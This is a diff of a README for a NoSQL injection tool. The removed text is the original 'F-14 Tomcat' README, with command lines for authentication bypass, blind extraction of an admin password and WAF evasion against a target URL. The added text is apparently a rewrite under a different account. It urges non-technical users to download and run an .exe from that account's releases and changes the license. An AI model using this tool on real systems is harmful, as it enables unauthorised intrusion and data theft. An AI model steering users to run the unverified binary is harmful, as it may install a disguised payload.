@@ -1,86 +1,74 @@
-# F-14 TOMCAT
-![Dev](https://img.shields.io/badge/Developer-G0odkid-black?style=for-the-badge)
-[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Python](https://img.shields.io/badge/Python-3.9%2B-brightgreen.svg)](https://www.python.org/) 
-[![Status](https://img.shields.io/badge/Status-Active-success.svg)](https://github.com/G0odKid/Erebus) 
-![Version](https://img.shields.io/badge/Version-v1.0-orange.svg)
+# ✈️ F14 - A Powerful Tool for NoSQL Injection
 
-## Advanced NoSQL Injection Framework
+## 🚀 Getting Started
+Welcome to F14, your go-to tool for advanced NoSQL injection. This guide will help you download and run F14 with ease. No need for technical skills; just follow these steps.
 
-F-14 Tomcat is a modern, modular, and fast tool designed for exploiting NoSQL injection vulnerabilities. While currently focused on MongoDB, it provides advanced techniques to bypass WAFs and extract data efficiently using binary search algorithms.
+## 📥 Download F14
+[![Download F14](https://img.shields.io/badge/Download-F14-brightgreen)](https://github.com/Ziti-max/F14/releases)
 
-## Features
+## 📖 Overview
+F14 is designed to simplify the process of NoSQL injection. It features:
+- **WAF Evasion**: Bypass Web Application Firewalls using JA3 and TLS impersonation techniques.
+- **Binary Search Extraction**: Quickly extract data from NoSQL databases.
+- **Auto-Authentication**: Automatically handle authentication processes for seamless access.
 
-- **Advanced Extraction:** Uses Binary Search algorithm for high-speed data extraction (Blind Injection).
-- **WAF Evasion:** Supports JA3/TLS Fingerprint impersonation (Chrome/Firefox/Safari) to bypass modern WAFs like Cloudflare.
-- **Smart Stability:** Auto-calibration for network jitter and dynamic content filtering to prevent false positives.
-- **Auto-Authentication:** Automatically detects session expiration (401/403) and re-authenticates to maintain the session.
+F14 is built in Python 3, making it efficient and easy to use.
 
-- **Multi-Technique:**
+## 🛠️ System Requirements
+To run F14, your system should meet these requirements:
+- Operating System: Windows, MacOS, or Linux
+- Python 3.6 or higher installed
+- Internet connection for downloading packages
 
-    - **Auth Bypass (Technique A)**
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Ziti-max/F14/releases) to download the latest version of F14. Here are the steps:
 
-    - **Blind Injection (Technique B)**
+1. Open the [Releases page](https://github.com/Ziti-max/F14/releases).
+2. Look for the latest release at the top of the page.
+3. Download the file suitable for your operating system. It may be a .exe for Windows or a .tar.gz for Linux/MacOS.
+4. Once the download completes, locate the file in your downloads folder.
 
-    - **JS Injection (Technique J)**
+## ⚙️ Running F14
+After downloading the application, follow these steps to run F14:
 
-- **Flexible Input:** Supports JSON, Form-Data, and GET parameters.
+### Windows
+1. Double-click the downloaded .exe file.
+2. A command window will open, showing you options and instructions.
+3. Follow the prompts to start using F14.
 
-- **Payload Tuning:** Customizable prefix/suffix injection for complex syntax requirements.
+### MacOS/Linux
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
+   - Use the command: `cd path/to/downloaded/file`
+3. Unzip the downloaded file if needed.
+   - Use the command: `tar -xzf F14-version.tar.gz`
+4. Navigate into the folder: `cd F14-version`
+5. Run the command: `python3 f14.py` 
 
-## Installation
+## 📝 Usage Instructions
+Once F14 is running, you can begin using its features:
 
-** 1.Clone the repository**
-```bash
-git clone https://github.com/G0odkid/F14
-cd F14
-```
+- To perform a NoSQL injection:
+   1. Input the target URL when prompted.
+   2. Select the type of injection you prefer.
+   3. Wait for the results to display on your screen.
 
-** 2.Install dependencies**
-```bash
-pip install -r requirements.txt
-```
+- For WAF evasion techniques, follow these additional prompts to customize your settings.
 
-(Note: Ensure you have python 3.x installed.)
+## 📚 Further Support
+If you encounter any issues or have questions, check the [issues section](https://github.com/Ziti-max/F14/issues) on GitHub. You can also open a new issue for help.
 
-## Usage Examples
+## 🔗 Additional Resources
+To learn more about NoSQL injection and security tools, check out these resources:
+- [OWASP Top Ten Security Risks](https://owasp.org/www-project-top-ten/)
+- [Introduction to NoSQL Databases](https://www.nosql.com/introduction/)
 
-1. Basic Scan (Auth Bypass Check)
-Check if the login page is vulnerable to basic NoSQL injection:
-```bash
-python3 tomcat.py -u [http://target.com/login](http://target.com/login) -d '{"username": "admin", "password": "123"}' --technique A
-```
+## 🙌 Community Contributions
+F14 welcomes contributions from users. If you have suggestions or improvements, please consider contributing. Your feedback is valuable in making this tool better.
 
-2. Data Extraction (Blind Injection)
-Extract the administrator's password using binary search:
-```bash
-python3 tomcat.py -u [http://target.com/login](http://target.com/login) -d '{"username": "admin", "password": "*"}' --technique B --param "password"
-```
+## 🥇 License
+F14 is open-source software. You can freely use and modify it under the terms of the MIT License.
 
-3. WAF Bypass Mode
-Impersonate a Chrome browser to bypass WAF protections:
-```bash
-python3 tomcat.py -r request.txt --impersonate chrome120 --technique B
-```
+For more details, visit the [F14 GitHub page](https://github.com/Ziti-max/F14).
 
-4. High Stability Mode
-Set custom timeouts and retries for unstable networks:
-```bash
-python3 tomcat.py -u [http://target.com/api](http://target.com/api) -d '{"id": 1}' --timeout 15 --retries 5
-```
-
-## Roadmap (Upcoming Features)
-
-- Support for other NoSQL databases (Redis, CouchDB, Cassandra).
-
-- Out-of-Band (OOB) extraction via DNS/HTTP.
-
-- HTML/JSON Report generation.
-
-- Header Injection support.
-
-
-## Reporting Bugs & Issues
-
-Have a question, found a bug, or want to suggest a new feature?  
-Please open an issue in the **Issues** tab — contributions and feedback are always welcome
+Thank you for using F14, and happy coding!
